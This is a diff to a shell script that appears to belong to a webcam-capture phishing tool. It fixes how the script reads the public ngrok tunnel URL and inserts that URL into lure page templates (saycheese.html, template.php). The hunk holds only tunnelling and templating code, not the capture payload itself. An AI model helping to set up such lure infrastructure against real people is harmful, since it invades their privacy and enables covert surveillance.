@@ -121,7 +121,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 payload_ngrok() {
 
-link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"([^"]*).*/\1/p')
 sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
@@ -167,7 +167,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"([^"]*).*/\1/p')
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
